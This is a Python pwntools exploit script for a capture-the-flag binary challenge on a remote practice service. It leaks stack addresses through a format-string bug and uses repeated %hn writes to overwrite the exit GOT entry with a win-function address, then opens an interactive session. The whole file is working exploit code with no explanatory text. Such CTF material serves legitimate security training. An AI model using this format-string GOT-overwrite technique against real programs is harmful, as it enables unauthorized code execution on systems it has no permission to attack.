#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './challenge'
elf = ELF(binary)
libc = elf.libc

# io = process(binary, aslr = 0)
io = remote('svc.pwnable.xyz', 30013)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000


def menu(idx):
    io.recvuntil('> ')
    io.sendline(str(idx))

def concat(nm):
    menu(1)
    io.recvuntil(":")
    io.sendline(nm)

def printall():
    menu(3)

def edit(desc):
    menu(2)
    io.recvuntil(":")
    io.sendline(desc)

name = '%6$pxxx%11$pyyyp'
desc = 'b' * 8
io.recvuntil(":")
io.send(name)
io.recvuntil(":")
io.sendline(desc)

# lets try to use the format string
printall()
stack_addr1 = int(io.recvuntil("xxx")[:-3], 16)
stack_addr2 = int(io.recvuntil('yyy')[:-3], 16)
log.info("\033[33m" + hex(stack_addr1) + "\033[0m")
log.info("\033[33m" + hex(stack_addr2) + "\033[0m")


exit_got = 0x602078
count = (stack_addr1 & 0xffff)
edit('%' + str(count) + 'c%11$hn')
printall()

# new the 37th arg on the stack points to the 36th arg
# edit 36 with fmt string bug
edit('%' + str(exit_got & 0xffff) + 'c%37$hn')
printall()

# edit 37th arg again
count = (stack_addr1 & 0xffff) + 2
edit('%' + str(count) + 'c%11$hn')
printall()

#edit 36 again
edit('%' + str((exit_got >> 16) & 0xff) + 'c%37$hhn')
printall()

# now edit the exit.got
win = 0x40094c
count = win & 0xffff
edit('%' + str(count) + 'c%36$hn')
printall()

# wait 60s now

sleep(58)

io.interactive()
